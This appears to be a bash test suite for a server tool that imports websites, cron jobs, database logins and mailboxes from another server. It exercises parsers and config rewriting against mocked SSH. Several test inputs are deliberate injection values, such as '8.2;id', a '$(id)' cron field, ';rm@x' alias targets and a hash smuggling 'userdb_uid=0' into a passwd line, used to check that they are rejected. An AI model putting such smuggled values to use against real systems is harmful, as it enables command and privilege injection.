printf '%s\n' $'S\tphp.example\t/srv/p\t1\tphp\t-\t0\t-\tols\t5.6' $'S\tphp2.example\t/srv/q\t1\tphp\t-\t0\t-\tols\t8.2;id' \
  $'C\t/srv/p\t* * * * *\ttrue' $'C\t/srv/p\t* * * * *\ttrue' $'C\t/srv/p\t61 * *\tshort' $'C\t/srv/p\t* * * * * root\tsix' \
  $'C\t/srv/p\t$(id) * * * *\tx' $'C\t/srv/it\'s\t* * * * *\tpath' $'C\t/srv/p\t@reboot\tboot' $'C\t/srv/p\t@hourly\t' \
  $'C\t/srv/p\t0 0 * * *\tbackup # server-setup:backup' $'C\t/srv/p\t0 0 * jan sun\tls -l\t/tmp' $'C\t/srv/p\t0 1 * * *\tbell\a' \
  | lib_import_scan_parse
assert_eq  "a PHP version that is none is not known"            "- -" "${IMP_PHP[*]}"
assert_eq  "a job counts once, and only one cron here could read" "* * * * *=true 0 0 * jan sun=ls -l /tmp" \
  "${IMP_CRON_WHEN[0]}=${IMP_CRON_CMD[0]} ${IMP_CRON_WHEN[1]}=${IMP_CRON_CMD[1]}"
assert_eq  "nothing else of them does"                          "2" "${#IMP_CRON_ROOT[@]}"
assert_eq  "a command for this server: its PHP and its directory" "{PHP} {HOME}/public_html/cron.php -q" \
  "$(_import_cron_rewrite '/usr/local/lsws/lsphp74/bin/php /home/x.example/public_html/cron.php -q' /home/x.example/public_html)"
assert_eq  "the home above a public_html too"                   "cd {HOME} && ./nightly.sh {HOME}/public_html" \
  "$(_import_cron_rewrite 'cd /home/x.example && ./nightly.sh /home/x.example/public_html' /home/x.example/public_html)"
assert_eq  "but not the directory above any other document root" "ls /var/www {HOME}/public_html" \
  "$(_import_cron_rewrite 'ls /var/www /var/www/html' /var/www/html)"
# ---- the login an application keeps in its own files ------------------------------
_im_f() { lib_import_dbconf "$1" | sort | awk -F'\t' '{ printf "%s=%s ", $2, $6 }'; }
assert_eq  "variables, and not the line that is commented out"   'host=localhost name=crmdb pass=old\'"'"'s "pw" user=stale ' "$(_im_f "$_im_crm/config.php")"
assert_eq  "define(), whatever the constants are called"         "host=db.internal:3307 name=defdb pass=def;pw user=defuser " "$(_im_f "$_im_cf/define.php")"
assert_eq  "the keys of an array"                                "host=localhost name=cidb pass=ci pw user=ciuser " "$(_im_f "$_im_cf/array.php")"
assert_eq  "a .env, quoted or not, without the comment after it" "host=127.0.0.1 name=envdb pass=env-pw1 user=envuser " "$(_im_f "$_im_cf/.env")"
cp "$_im_cf/.env" "$_im_cf/copy.in"
assert_has "a copy of a .env is read as one when it is said to be one" "name=envdb" "$(lib_import_dbconf "$_im_cf/copy.in" "/srv/site/.env" | awk -F'	' '{ printf "%s=%s ", $2, $6 }')"
assert_lacks "and not when it is not"                            "name=envdb" "$(_im_f "$_im_cf/copy.in")"
assert_eq  "the arguments of mysqli, user and database alike"    "host=localhost name=same pass=pw5 user=same " "$(_im_f "$_im_cf/call.php")"
assert_eq  "a PDO address gives the database and the host"       "host=dbhost name=pdodb " "$(_im_f "$_im_cf/pdo.php")"
assert_eq  "Turkish names"                                       'host=localhost name=trdb pass=tr$ifre user=truser ' "$(_im_f "$_im_cf/turkce.php")"
assert_eq  "a name that says database counts before one that is the mail's" "name=realdb pass=real-pw user=realuser " \
  "$(_im_f "$_im_cf/mixed.php" | sed 's/host=[^ ]* //')"
_im_rw() {   # file name user password -> the file with them in place
  lib_import_dbconf "$1" >"$TMP/im-pos"
  lib_import_dbconf_rewrite "$1" "$TMP/im-pos" "$2" "$3" "$4"
}
_im_new="$(_im_rw "$_im_crm/config.php" newdb newuser NewPw9)"
assert_has "the name where it stood, the comment behind it kept" "\$db_name = 'newdb';   // the database" "$_im_new"
assert_has "the user"                                            "\$db_user = 'newuser';" "$_im_new"
assert_has "the password, whatever was between its quotes"       "\$db_pass = 'NewPw9';" "$_im_new"
assert_has "the mail settings on the next line are not touched"  "\$smtp_host = 'smtp.example.org'; \$password = 'smtp-secret';" "$_im_new"
assert_has "nor the line that is commented out"                  "// \$db_name = 'commented_out';" "$_im_new"
assert_eq  "as many lines as before"                             "7" "$(wc -l <<<"$_im_new" | tr -d ' ')"
assert_has "four values on one line, each in its own place"      '$c = new mysqli("localhost", "newuser", "NewPw9", "newdb");' "$(_im_rw "$_im_cf/call.php" newdb newuser NewPw9)"
assert_has "a .env keeps its comment"                            "DB_PASSWORD=NewPw9   # the password" "$(_im_rw "$_im_cf/.env" newdb newuser NewPw9)"
assert_has "and its host becomes this server"                    'DB_HOST="localhost"' "$(_im_rw "$_im_cf/.env" newdb newuser NewPw9)"
assert_has "a host with a port becomes this server too"          'define("DB_HOST", "localhost");' "$(_im_rw "$_im_cf/define.php" newdb newuser NewPw9)"
assert_eq  "a file without a whole login is said to be one"      "3" "$(_im_rw "$_im_cf/pdo.php" a b c >/dev/null && printf 0 || printf '%s' "$?")"
_im_pick() { ( eval "$(lib_import_remote_lib)"; PATH="$_im_bin:$PATH" IM_CLIENT_RC=1 IM_CLIENT_USER="$1" dbconf_pick "$_im_crm" ); }
assert_eq  "of two files, the one whose login the database takes" "$_im_crm/include/db.php" "$(_im_pick crmuser)"
assert_eq  "when none can be tried, the one nearest the top"     "$_im_crm/config.php" "$(_im_pick nobody)"
assert_lacks "a library's own files are not looked into"         "vendor" "$( ( eval "$(lib_import_remote_lib)"; dbconf_files "$_im_crm" ) )"
assert_eq  "the listing names the application's database and the file it is in" \
  "$_im_crm|php|crmdb|0|$_im_crm/config.php|dir" "$(_im_row crm.example)"

# ---- the choice ----------------------------------------------------------------
assert_eq  "numbers"                    "0 2"   "$(lib_import_pick "1,3" 3 | tr '\n' ' ' | sed 's/ $//')"
assert_eq  "a range, and each once"     "1 2 0" "$(lib_import_pick "2-3 1 2" 3 | tr '\n' ' ' | sed 's/ $//')"
assert_eq  "all"                        "0 1 2" "$(lib_import_pick "ALL" 3 | tr '\n' ' ' | sed 's/ $//')"
assert_false "a number that is not in the list" lib_import_pick "4" 3
assert_false "zero"                     lib_import_pick "0" 3
assert_false "a word"                   lib_import_pick "shop" 3
assert_false "nothing"                  lib_import_pick " " 3
assert_false "a range that goes backwards" lib_import_pick "3-1" 3

# ---- wp-config.php ---------------------------------------------------------------
_im_cfg="$(lib_import_wpconfig_rewrite newdb newuser NewPass123 <"$_im_shop/wp-config.php")"
assert_has "the database name of this server"  "define( 'DB_NAME', 'newdb' );" "$_im_cfg"
assert_has "its user, whatever quotes the line had" "define( 'DB_USER', 'newuser' );" "$_im_cfg"
assert_has "its password"                      "define( 'DB_PASSWORD', 'NewPass123' );" "$_im_cfg"
assert_has "and the host"                      "define( 'DB_HOST', 'localhost' );" "$_im_cfg"
assert_lacks "the old login is gone"           "shopuser" "$_im_cfg"
assert_lacks "with its socket"                 "old.sock" "$_im_cfg"
assert_has "every other line stays"            "\$table_prefix = 'wx_';" "$_im_cfg"
assert_eq  "as many lines as before"           "7" "$(wc -l <<<"$_im_cfg" | tr -d ' ')"
assert_eq  "a file without the login lines is said to be one" "3" \
  "$(printf '<?php\ndefine( "DB_NAME", "x" );\n' | lib_import_wpconfig_rewrite a b c >/dev/null && printf 0 || printf '%s' "$?")"

# ---- the dump, on the other server -------------------------------------------------
_im_dump() {   # database wp-config client-status
  lib_import_remote_dump | env PATH="$_im_bin:$PATH" DB="$1" CONF="$2" IM_CLIENT_RC="$3" bash -s 2>/dev/null | gzip -dc 2>/dev/null || true
}
_im_d="$(_im_dump shopdb "$_im_shop/wp-config.php" 1)"
assert_has "an account that cannot open the database borrows WordPress's login" 'user="shopuser"' "$_im_d"
assert_has "the password as PHP reads it, quoted for the option file" 'password="p'"'"'a\"s\\x"' "$_im_d"
assert_has "the socket DB_HOST names"          'socket="/run/mysqld/old.sock"' "$_im_d"
assert_has "the login is in a file, first on the command line" "-- ARGS --defaults-extra-file=" "$_im_d"
assert_lacks "no password among the arguments" "p'a" "$(grep -- '-- ARGS' <<<"$_im_d")"
assert_lacks "a borrowed login is not asked for the routines" "--routines" "$_im_d"
assert_has "the dump ends the way a dump ends" "-- Dump completed" "$_im_d"
_im_d="$(_im_dump shopdb "$_im_shop/wp-config.php" 0)"
assert_lacks "an account that can open it needs no login" "LOGIN" "$_im_d"
assert_has "and brings the routines too"       "--routines shopdb" "$_im_d"
assert_eq  "no access and no wp-config.php is an error of its own" "4" \
  "$(lib_import_remote_dump | env PATH="$_im_bin:$PATH" DB=shopdb CONF= IM_CLIENT_RC=1 bash -s >/dev/null 2>&1 && printf 0 || printf '%s' "$?")"

# ---- the command -----------------------------------------------------------------
_im_home="https://www.shop.example"; _im_add_ok=1; _im_dump_mode=""; _im_mail=0; _im_php_ok=1; _im_client_user=""
_im_site() {   # domain mode
  lib_domain_state_reset
  D_DOMAIN="$1"; D_IDENT="$(lib_domain_ident "$1")"; D_USER="$D_IDENT"; D_GROUP="$D_IDENT"
  D_HOME="$SITES_ROOT/$1"; D_MODE="$2"; D_PHP="8.3"; D_MEMORY="256M"; D_UPLOAD="64M"; D_STATUS="active"
  lib_domain_state_save
  mkdir -p "$D_HOME/public_html" "$D_HOME/private/tmp"
  printf '<body><p>This site was %s.</p></body>\n' "$DOMAIN_PLACEHOLDER_MARK" >"$D_HOME/public_html/index.html"
}
eval '_import_ssh() { env PATH="$_im_bin:$PATH" LOMP_IMPORT_ROOT="$_im_r" LOMP_IMPORT_OWNER="$_im_me" IM_CLIENT_RC=1 IM_DUMP_MODE="$_im_dump_mode" IM_MAIL_USERS="$_im_users" IM_CLIENT_USER="$_im_client_user" sh -c "$1"; }
      lib_mail_installed() { (( _im_mail )); }
      lib_import_connect() { IMP_SSH_OPTS=(); printf "connect %s port=%s key=%s pw=%s\n" "$IMP_SSH_TARGET" "$1" "$2" "$3" >>"$_im_log"; }
      lib_require_tools() { return 0; }
      lib_require_installed() { return 0; }
      lib_server_mail_only() { return 1; }
      lib_ols_htaccess_reload() { printf "reload\n" >>"$_im_log"; }
      lib_domain_apply_config() { printf "apply %s www=%s primary=%s db=%s\n" "$D_DOMAIN" "$D_WWW" "$D_WWW_PRIMARY" "$D_DB_NAME" >>"$_im_log"; }
      lib_backup_domain() { printf "backup %s\n" "$*" >>"$_im_log"; }
      lib_db_create_for_domain() {
        printf "DB_NAME=%s_db\nDB_USER=%s_user\nDB_PASS=LocalPass9\n" "${1%%.*}" "${1%%.*}" >"$(lib_db_info_file "$1")"
        lib_json_set "$(lib_domain_json "$1")" ".db = {name:\$n, user:\$u}" --arg n "${1%%.*}_db" --arg u "${1%%.*}_user"
        printf "dbcreate %s\n" "$1" >>"$_im_log"
        lib_db_info_load "$1"
      }
      lib_db_restore_domain() { lib_db_info_load "$1" || return 1; gzip -dc "$2" >"$TMP/im-restored-$1.sql"; }
      lib_db_sql() { printf "%s\n" "$_im_home"; }
      _domain_fix_owner_ids() { printf "%s" "$_im_ids"; }
      _import_php_available() { (( _im_php_ok )); }
      _import_php_defaults() { IMP_DEF_MEM=256; IMP_DEF_UPL=64; }
      _import_add() {
        printf "add %s\n" "$*" >>"$_im_log"
        (( _im_add_ok )) || return 1
        if [[ " $* " == *" --static "* ]]; then _im_site "$1" static; else _im_site "$1" php; fi
      }'
mkdir -p "$SITES_ROOT/im-probe"; read -r _im_u _im_g < <(stat -c '%u %g' "$SITES_ROOT/im-probe"); _im_ids="${_im_u} ${_im_g}"
_imf() {   # the command the way setup.sh runs it; prints the status, the output goes to $_im_out
  local rc=0 prev=""
  prev="$(trap -p ERR || true)"
  trap - ERR
  set +e
  ( set -Eeuo pipefail; shopt -s lastpipe; OPT_QUIET=0; lib_import_main "$@" ) >"$_im_out" 2>&1 </dev/null
  rc=$?
  set -e
  [[ -z "$prev" ]] || eval "$prev"
  printf '%s' "$rc"
}
: >"$_im_log"
assert_eq  "--list shows what is there"                 "0" "$(_imf old.example --port 2222 --list)"
assert_has "a host alone is root's"                     "connect root@old.example port=2222" "$(cat "$_im_log")"
assert_has "the site, what it is and its database"      "shop.example" "$(grep 'wordpress' "$_im_out")"
assert_has "that it would be new here"                  "new" "$(grep 'blog.example' "$_im_out")"
assert_has "and what has no name, with the way to bring it" "--path <directory> --as <domain>" "$(cat "$_im_out")"
assert_lacks "and adds nothing"                         "add " "$(cat "$_im_log")"
assert_eq  "with nobody to ask, the sites have to be named" "1" "$(_imf old.example)"
assert_has "which the refusal says"                     "--all or --only" "$(cat "$_im_out")"
assert_eq  "a site that is not there is refused"        "1" "$(_imf old.example --only nope.example)"
assert_has "by name"                                    "nope.example was not found" "$(cat "$_im_out")"

: >"$_im_log"; : >"$RUNUSER_LOG"
_im_d1="$SITES_ROOT/shop.example/public_html"; _im_d2="$SITES_ROOT/blog.example/public_html"
assert_eq  "two sites that are not here yet"            "0" "$(_imf user@old.example --only shop.example,blog.example)"
assert_has "the WordPress is added without a certificate, on the PHP it ran, with www" "add shop.example --no-ssl --php 7.4 --memory 1024M --www" "$(cat "$_im_log")"
assert_has "a limit above this server's own comes along, which the plan said" \
  "shop.example: it keeps the PHP limits it has there, which are above this server's own (--memory 1024M)" "$(cat "$_im_out")"
assert_lacks "one below it does not"                    "--upload" "$(cat "$_im_log")"
assert_has "which the plan said"                        "shop.example: it runs PHP 7.4 there, and gets that here" "$(cat "$_im_out")"
_im_ct="$(cat "$CRON_FILE" 2>/dev/null || true)"; _im_su="$(lib_domain_ident shop.example)"; _im_bu="$(lib_domain_ident blog.example)"
assert_has "its cron job runs here as the site user, with the PHP and the directory it has here" \
  "*/5 * * * * ${_im_su} ${LSWS_HOME}/lsphp83/bin/php ${_im_d1}/cron.php >/dev/null 2>&1 # server-setup:imported:shop.example:1" "$_im_ct"
assert_has "the one that works in its home too"         "@daily ${_im_su} cd ${SITES_ROOT}/shop.example && ./nightly.sh # server-setup:imported:shop.example:2" "$_im_ct"
assert_has "a job of root's becomes the site's"         "0 3 * * * ${_im_bu} curl -s https://blog.example/cron.php # server-setup:imported:blog.example:" "$_im_ct"
assert_has "one of /etc/cron.d too, under the directory here" "30 2 * * mon ${_im_bu} php ${_im_d2}/job.php # server-setup:imported:blog.example:" "$_im_ct"
assert_lacks "nothing runs as root"                     " root " "$(grep imported: <<<"$_im_ct")"
assert_has "how many is said, and as whom"              "2 cron job(s) of shop.example now run here as ${_im_su}" "$(cat "$_im_out")"
assert_has "and that they run in two places now"        "They still run on the other server as well" "$(cat "$_im_out")"
assert_has "which the plan said too"                    "shop.example: and its 2 cron job(s)" "$(cat "$_im_out")"
assert_true "what a site was given is kept with it"     test -s "$(lib_import_cron_file shop.example)"
assert_has "the static one without PHP or a database"   "add blog.example --no-ssl --static --no-db" "$(cat "$_im_log")"
assert_true "the files are in its document root"        test -f "$_im_d1/index.php"
assert_true "the hidden ones too"                       test -f "$_im_d1/.htaccess"
assert_true "and the uploads"                           test -f "$_im_d1/wp-content/uploads/a.txt"
assert_false "the page cache stays behind"              test -e "$_im_d1/wp-content/cache/page.html"
assert_false "the page a new site starts with is gone"  test -e "$_im_d1/index.html"
assert_has "they are unpacked by the site's user, not by root" \
  "-u $(lib_domain_ident shop.example) -- env -C / tar -C $_im_d1 --no-overwrite-dir -xzpf -" "$(cat "$RUNUSER_LOG")"
assert_has "the database goes into the site's own"      "dbcreate shop.example" "$(cat "$_im_log")"
_im_sql="$(cat "$TMP/im-restored-shop.example.sql" 2>/dev/null || true)"
assert_has "what was imported is the dump"              "CREATE TABLE t" "$_im_sql"
assert_has "MySQL 8's collation becomes one MariaDB has" "COLLATE=utf8mb4_unicode_520_ci" "$_im_sql"
assert_lacks "and is nowhere left"                      "utf8mb4_0900_ai_ci" "$_im_sql"
assert_has "wp-config.php names the database here"      "define( 'DB_NAME', 'shop_db' );" "$(cat "$_im_d1/wp-config.php")"
assert_has "and its password"                           "define( 'DB_PASSWORD', 'LocalPass9' );" "$(cat "$_im_d1/wp-config.php")"
assert_has "a WordPress that lives at www gets the site to answer there, its database still on record" \
  "apply shop.example www=1 primary=1 db=shop_db" "$(cat "$_im_log")"
assert_eq  "which is kept"                              "true" "$(jq -r '.www_primary' "$(lib_domain_json shop.example)")"
assert_eq  "the static site has the other server's page" "the blog" "$(cat "$_im_d2/index.html")"
assert_lacks "and no database"                          "dbcreate blog.example" "$(cat "$_im_log")"
assert_lacks "a new site needs no backup first"         "backup " "$(cat "$_im_log")"
assert_has "OpenLiteSpeed reads the .htaccess files that came" "reload" "$(cat "$_im_log")"
assert_has "the count is said"                          "2 site(s) imported" "$(cat "$_im_out")"
assert_has "and what comes next"                        "renew-ssl" "$(cat "$_im_out")"

: >"$_im_log"
assert_has "what was copied, from where and when, is kept with the site" "$_im_shop" "$(cat "$(lib_import_mark_file shop.example)" 2>/dev/null)"
sleep 1
printf 'changed there\n' >"$_im_shop/wp-content/uploads/a.txt"; printf 'mine\n' >"$_im_d1/kept.txt"
sleep 1
assert_eq  "a site that is here already"                "0" "$(_imf old.example --only shop.example)"
assert_lacks "is not added again"                       "add " "$(cat "$_im_log")"
assert_has "keeps the PHP it has here, which is said"   "shop.example runs PHP 7.4 there and PHP 8.3 here" "$(cat "$_im_out")"
assert_has "and its limits, with the larger one there named" "shop.example has a memory_limit of 1024M there and 256M here" "$(cat "$_im_out")"
assert_lacks "a smaller one is nothing to say"          "takes uploads of" "$(cat "$_im_out")"
assert_eq  "has its jobs once, not twice"               "2" "$(grep -c 'imported:shop.example:' "$CRON_FILE")"
assert_has "is backed up as it is first"                "backup shop.example --tag pre-import --keep 0 --no-mail" "$(cat "$_im_log")"
assert_has "which the plan says"                        "A backup is taken first" "$(cat "$_im_out")"
assert_eq  "a file of the same name is replaced"        "changed there" "$(cat "$_im_d1/wp-content/uploads/a.txt")"
assert_eq  "one that is only here stays"                "mine" "$(cat "$_im_d1/kept.txt")"
assert_lacks "its settings are left alone"              "apply " "$(cat "$_im_log")"
assert_has "only what changed there since is asked for" "that changed there since" "$(cat "$_im_out")"
: >"$RUNUSER_LOG"
assert_eq  "a third time, with nothing changed there"   "0" "$(_imf old.example --only shop.example --no-cron)"
assert_has "nothing is copied, which is said"           "nothing to copy" "$(cat "$_im_out")"
assert_lacks "no archive is unpacked"                   "tar -C $_im_d1" "$(cat "$RUNUSER_LOG")"
assert_has "wp-config.php still names the database here" "define( 'DB_NAME', 'shop_db' );" "$(cat "$_im_d1/wp-config.php")"
assert_eq  "no list is left on the other side"          "" "$(find "${TMPDIR:-/tmp}" -maxdepth 1 -name 'tmp.*' -newer "$_im_out" 2>/dev/null | head -n 1)"
rm -f "$_im_d1/index.php"
assert_eq  "a file deleted here"                        "0" "$(_imf old.example --only shop.example --no-cron)"
assert_false "stays deleted: it did not change there"   test -e "$_im_d1/index.php"
assert_eq  "--full"                                     "0" "$(_imf old.example --only shop.example --no-cron --full)"
assert_true "copies everything again"                   test -f "$_im_d1/index.php"
rm -f "$_im_d1/index.php"
printf 'another-machine\t%s\t9999999999\n' "$_im_shop" >"$(lib_import_mark_file shop.example)"
assert_eq  "what was copied from another server"        "0" "$(_imf old.example --only shop.example --no-cron)"
assert_true "says nothing about this one: everything comes" test -f "$_im_d1/index.php"
rm -f "$_im_d1/index.php"
printf '%s\t%s\t9999999999\n' "$(cut -f1 "$(lib_import_mark_file shop.example)")" "/some/other/dir" >"$(lib_import_mark_file shop.example)"
assert_eq  "nor does a copy of another directory"       "0" "$(_imf old.example --only shop.example --no-cron)"
assert_true "of the same server"                        test -f "$_im_d1/index.php"
assert_has "a restore forgets it: the files are the archive's again" 'rm -f -- "$(lib_import_mark_file "$domain")"' "$(declare -f lib_restore_main)"

: >"$_im_log"
assert_eq  "--no-create leaves out what is not here"    "0" "$(_imf old.example --only panel.example --no-create)"
assert_has "and says so"                                "panel.example: left out" "$(cat "$_im_out")"
assert_lacks "without adding it"                        "add " "$(cat "$_im_log")"
OPT_DRY_RUN=1
assert_eq  "a dry run"                                  "0" "$(_imf old.example --all)"
OPT_DRY_RUN=0
assert_has "says what it would bring"                   "[dry-run] would import 4 site(s)" "$(cat "$_im_out")"
assert_lacks "and brings nothing"                       "add " "$(cat "$_im_log")"

: >"$_im_log"
assert_eq  "a directory without a name, as a domain"    "0" "$(_imf old.example --path "$_im_l/Example/html" --as EX.example)"
assert_has "is a site of that name"                     "add ex.example --no-ssl --static --no-db" "$(cat "$_im_log")"
assert_eq  "with its page"                              "example page" "$(cat "$SITES_ROOT/ex.example/public_html/index.html")"
assert_eq  "a directory that is not there"              "1" "$(_imf old.example --path /nowhere/at/all --as none.example)"
assert_has "is said to be none"                         "is not a directory on root@old.example" "$(cat "$_im_out")"
: >"$_im_log"
assert_eq  "--db names the database of a site that is no WordPress" "1" "$(_imf old.example --path "$_im_r/var/www/html" --as app.example --db appdb)"
assert_has "which an account that cannot open it cannot bring" "this account cannot open the database appdb" "$(cat "$_im_out")"
assert_true "its files are in place all the same"       test -f "$SITES_ROOT/app.example/public_html/index.php"
assert_has "and the run ends by naming it"              "Not imported: app.example" "$(cat "$_im_out")"

# ---- the mailboxes ---------------------------------------------------------------
assert_eq  "a bcrypt hash is one Dovecot here can check"        "$_im_hash" "$(_import_hash "$_im_hash")"
assert_eq  "CyberPanel's way of writing it too"                 "$_im_hash" "$(_import_hash "{CRYPT}${_im_hash#\{BLF-CRYPT\}}")"
assert_eq  "and a bare one"                                     "$_im_hash" "$(_import_hash "${_im_hash#\{BLF-CRYPT\}}")"
assert_eq  "a salted SHA-512 stays what it is"                  '{SHA512-CRYPT}$6$saltsalt$abcdefghijklmnopqrstuvwxyz0123456789' "$(_import_hash '{SHA512-CRYPT}$6$saltsalt$abcdefghijklmnopqrstuvwxyz0123456789')"
assert_eq  "a password kept in the clear is not taken over"     "-" "$(_import_hash '{PLAIN}secret-of-the-boss')"
assert_eq  "nor is a hash with a colon in it"                   "-" "$(_import_hash '{SSHA}abcdefgh:x::::::userdb_uid=0')"
assert_eq  "nor nothing"                                        "-" "$(_import_hash '-')"
assert_eq  "the usual quota when the mailbox is small"          "1G" "$(_import_mail_quota 1G 100)"
assert_eq  "twice the mailbox when it is not"                   "4G" "$(_import_mail_quota 1G 2000000)"
assert_eq  "megabytes are counted as megabytes"                 "1G" "$(_import_mail_quota 500M 300000)"
assert_eq  "no limit stays no limit"                            "0"  "$(_import_mail_quota 0 9000000)"
printf '%s\n' $'M\tGood@Box.Example\t/srv/m\t12\t'"$_im_hash" $'M\tgood@box.example\t/srv/again\t1\t-' $'M\tno at sign\t/srv/m\t1\t-' \
  $'M\tx@box.example\t/srv/it\'s\tmany\t{PLAIN}pw' $'M\ta;b@box.example\t/srv/m\t1\t-' | lib_import_scan_parse
assert_eq  "a mailbox line counts once, in small letters"       "good@box.example x@box.example" "${IMP_BOX[*]}"
assert_eq  "with its Maildir, size and hash, each checked"      "/srv/m|12|$_im_hash|-|0|-" "${IMP_BOX_DIR[0]}|${IMP_BOX_KB[0]}|${IMP_BOX_HASH[0]}|${IMP_BOX_DIR[1]}|${IMP_BOX_KB[1]}|${IMP_BOX_HASH[1]}"
assert_eq  "its domain is an entry of the kind mail"            "box.example mail" "${IMP_DOMAIN[*]} ${IMP_KIND[*]}"
printf '%s\n' $'A\tFwd@Al.Example\tGood@T.example,bad target,;rm@x,good@t.example,two@t.example' $'A\tnokey\tx@y.example' \
  $'A\ty@al.example\tjunk' $'A\tfwd@al.example\tlater@t.example' $'A\t@al.example\tz@t.example' | lib_import_scan_parse
assert_eq  "an alias line: small letters, and only the targets that are addresses" "fwd@al.example=good@t.example,two@t.example @al.example=z@t.example" \
  "${IMP_ALIAS[0]}=${IMP_ALIAS_TO[0]} ${IMP_ALIAS[1]}=${IMP_ALIAS_TO[1]}"
assert_eq  "nothing else of it counts"                          "2" "${#IMP_ALIAS[@]}"
assert_eq  "a domain with aliases alone is an entry too"        "al.example mail" "${IMP_DOMAIN[*]} ${IMP_KIND[*]}"

_im_mail=1; _im_sync_ok=1
_im_pw="$TMP/im-passwd"; : >"$_im_pw"
MAIL_PASSWD_FILE="$_im_pw"; MAIL_ALIAS_DIR="$TMP/im-aliases"; mkdir -p "$MAIL_ALIAS_DIR"
eval 'lib_mail_installed() { (( _im_mail )); }
      lib_mail_domain_enabled() { [[ -e "$TMP/im-mailon-$1" ]]; }
      _import_mail_on() {
        if lib_domain_registered "$1"; then printf "mailon %s site\n" "$1" >>"$_im_log"; else printf "mailon %s domain\n" "$1" >>"$_im_log"; fi
        : >"$TMP/im-mailon-$1"
      }
      lib_mail_hash_password() { printf "{BLF-CRYPT}\$2y\$05\$newhash%s" "$1"; printf "%s\n" "$1" >>"$TMP/im-newpw"; }
      lib_mail_tables_apply() { printf "tables\n" >>"$_im_log"; }
      _mail_sendas_current() { printf "sendas\n" >>"$_im_log"; }
      lib_mail_domain_aliases_seed() { printf "seed %s %s\n" "$1" "$2" >>"$_im_log"; }
      _mail_stage_dir() { mktemp -d "$TMP/im-stage.XXXXXX"; }
      _mail_stage_drop() { rm -rf "$1"; }
      _import_mail_sync() {
        printf "sync %s\n" "$1" >>"$_im_log"
        (( _im_sync_ok )) || return 1
        ( cd "$2" && find . -type f | sort ) >"$TMP/im-synced-$1"
      }'
: >"$_im_log"; : >"$RUNUSER_LOG"; : >"$TMP/im-newpw"
assert_eq  "the list counts the mailboxes of a site"           "0" "$(_imf old.example --list)"
assert_has "two of them"                                        " 2 " "$(grep 'shop.example' "$_im_out" | sed 's/  */ /g')"
assert_has "a domain with mailboxes and no site is listed too"  "mail" "$(grep 'mailonly.example' "$_im_out")"
assert_eq  "a site that is here, with its mailboxes"            "0" "$(_imf old.example --only shop.example)"
assert_has "the plan names them"                                "shop.example: and its 2 mailbox(es)" "$(cat "$_im_out")"
assert_has "and the aliases"                                    "and 4 alias(es)" "$(grep 'shop.example: and its' "$_im_out")"
_im_al="$(cat "$MAIL_ALIAS_DIR/shop.example" 2>/dev/null || true)"
assert_has "an alias goes where it went there"                  $'sales2@shop.example\tinfo@shop.example' "$_im_al"
assert_has "the catch-all too"                                  $'@shop.example\tinfo@shop.example' "$_im_al"
assert_has "and an address this server would point at the first mailbox" $'postmaster@shop.example\tadmin@elsewhere.example' "$_im_al"
assert_lacks "an address that is a mailbox here is not made an alias as well" $'info@shop.example\tinfo@shop.example,ext' "$_im_al"
assert_has "which is said, with where its mail went there"      "info@shop.example is a mailbox here, so it was not made an alias as well: on the other server its mail goes to info@shop.example,ext@far.example" "$(cat "$_im_out")"
assert_has "how many were set"                                  "3 alias(es) and forwarder(s) of shop.example set here" "$(cat "$_im_out")"
assert_has "mail is turned on for the site, by a command that leaves DNS alone" "mailon shop.example site" "$(cat "$_im_log")"
assert_has "which is how it is called"                          'mail enable "$1" --no-dns' "$(printf '%s' "$_im_orig" | grep -A3 '^_import_mail_on')"
assert_has "a mailbox keeps the password it had"                "info@shop.example:${_im_hash}::::::userdb_quota_rule=*:storage=1G" "$(cat "$_im_pw")"
assert_has "one whose hash is not known gets a new one"         'sales@shop.example:{BLF-CRYPT}$2y$05$newhash' "$(cat "$_im_pw")"
_im_newpw="$(head -n 1 "$TMP/im-newpw")"
assert_true "of twenty characters"                              test "${#_im_newpw}" -eq 20
assert_has "shown once, beside its address"                     "sales@shop.example   ${_im_newpw}" "$(cat "$_im_out")"
assert_lacks "and not written to the log"                       "$_im_newpw" "$(cat "$LOG_FILE")"
assert_lacks "the hash that was taken over is not printed"      "abcdefghijklmnopqrstuu" "$(cat "$_im_out")"
assert_has "how many, and how many with their password"         "2 mailbox(es) of shop.example made here, 1 with the password they had there" "$(cat "$_im_out")"
assert_has "the mail is unpacked by the mail user"              "-u ${MAIL_VMAIL_USER} -- tar -C $TMP/im-stage." "$(cat "$RUNUSER_LOG")"
assert_has "and merged into the mailbox"                        "sync info@shop.example" "$(cat "$_im_log")"
_im_synced="$(cat "$TMP/im-synced-info@shop.example" 2>/dev/null || true)"
assert_has "the messages came"                                  "./cur/1700000000.M1P1.old:2,S" "$_im_synced"
assert_has "the folders too"                                    "./.Sent/cur/1700000001.M2P1.old:2,S" "$_im_synced"
assert_has "and what numbers the messages"                      "./dovecot-uidlist" "$_im_synced"
assert_lacks "Dovecot's indexes stay behind"                    "dovecot.index" "$_im_synced"
assert_has "a mailbox without a Maildir there is said to be empty" "sales@shop.example: no Maildir of it was found there" "$(cat "$_im_out")"
assert_lacks "and nothing is merged into it"                    "sync sales@shop.example" "$(cat "$_im_log")"
assert_eq  "no staging directory is left"                       "" "$(find "$TMP" -maxdepth 1 -name 'im-stage.*' | head -n 1)"
assert_has "where the mail goes on arriving is said"            "until its MX points here: setup.sh mail dns shop.example" "$(cat "$_im_out")"
_im_sum="$(cksum <"$_im_pw")"; : >"$_im_log"
lib_mail_alias_set shop.example sales2@shop.example changed@here.example
assert_eq  "the same again"                                     "0" "$(_imf old.example --only shop.example)"
assert_has "an alias this server has stays as it is here"       $'sales2@shop.example\tchanged@here.example' "$(cat "$MAIL_ALIAS_DIR/shop.example")"
assert_has "which is counted"                                   "3 alias(es) of shop.example that this server already has were left as they are" "$(cat "$_im_out")"
assert_lacks "none is set a second time"                        "set here" "$(cat "$_im_out")"
assert_eq  "makes no mailbox twice and changes no password"     "$_im_sum" "$(cksum <"$_im_pw")"
assert_has "and merges the mail once more"                      "sync info@shop.example" "$(cat "$_im_log")"
assert_lacks "mail that is on is not turned on again"           "mailon" "$(cat "$_im_log")"

: >"$_im_log"
assert_eq  "a domain with mailboxes and no site"                "0" "$(_imf old.example --only mailonly.example)"
assert_has "becomes a mail domain, which the plan says"         "mailonly.example: 1 mailbox(es)" "$(grep 'becomes a mail domain here' "$_im_out")"
assert_has "and not a site"                                     "mailon mailonly.example domain" "$(cat "$_im_log")"
assert_lacks "no site is added for it"                          "add mailonly.example" "$(cat "$_im_log")"
